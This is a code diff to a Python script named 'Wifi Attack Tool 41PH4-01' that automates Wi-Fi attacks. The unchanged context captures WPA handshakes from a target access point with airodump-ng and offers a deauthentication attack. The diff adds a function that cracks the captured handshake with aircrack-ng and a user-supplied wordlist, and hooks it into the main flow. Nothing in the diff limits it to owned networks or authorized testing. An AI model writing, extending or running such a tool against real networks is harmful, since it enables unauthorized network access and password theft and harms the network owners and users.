@@ -53,6 +53,10 @@ def display_splash_screen():
     print("Wifi Attack Tool 41PH4-01\n")
 
 
+import subprocess
+import sys
+import os
+
 # Function to check if a tool is installed and install it if not
 def check_and_install_tool(tool_name, install_command):
     try:
@@ -88,6 +92,15 @@ def capture_handshake(interface, target_mac, output_file):
     print(f"Capturing WPA handshake on {interface}...")
     subprocess.run(["sudo", "airodump-ng", "-c", "6", "--bssid", target_mac, "-w", output_file, interface], check=True)
 
+# Function to crack WPA handshake using aircrack-ng
+def crack_wpa_handshake(output_file, wordlist):
+    print(f"Attempting to crack WPA handshake using {wordlist}...")
+    try:
+        subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, f"{output_file}-01.cap"], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error cracking WPA handshake: {e}")
+        sys.exit(1)
+
 # Main function that automates the process
 def main():
     # Check if necessary tools are installed
@@ -115,6 +128,12 @@ def main():
     deauth_choice = input("Do you want to perform a deauth attack? (y/n): ")
     if deauth_choice.lower() == 'y':
         deauth_attack(monitor_interface, target_mac, "6")
+
+    # Ask for wordlist to crack WPA
+    wordlist = input("Enter the path to your wordlist (e.g., /path/to/wordlist.txt): ")
+
+    # Attempt to crack the WPA handshake
+    crack_wpa_handshake(output_file, wordlist)
 
     # Restart the network and cleanup
     print("Cleaning up and restarting the network...")
